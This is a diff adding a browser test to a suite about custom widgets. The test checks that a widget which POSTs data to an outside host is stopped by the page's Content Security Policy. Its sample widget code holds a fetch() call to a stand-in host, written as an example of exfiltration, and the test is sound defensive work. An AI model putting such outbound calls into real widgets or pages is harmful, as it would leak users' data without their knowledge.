@@ -1138,6 +1138,21 @@ describe("custom widgets and languages", () => {
     expect(errors).toEqual([]);
   });
 
+  it("blocks a custom widget that sends data out", async () => {
+    const code = `
+      fetch("https://example.invalid/x", { method: "POST", body: "1" })
+        .then(() => { el.textContent = "sent"; })
+        .catch(() => { el.textContent = "blocked"; });`;
+    const { page, errors } = await open(
+      browser,
+      pageFile({ widgets: [custom("leak", code)], layout: on("leak") }),
+    );
+    await page.waitForFunction(() =>
+      document.querySelector("[data-id=leak]")?.textContent?.includes("blocked"),
+    );
+    expect(errors.join("\n")).toMatch(/Content Security Policy|Content-Security-Policy/);
+  });
+
   it("shows the error of a failing widget in its own tile only", async () => {
     const { page, errors } = await open(
       browser,
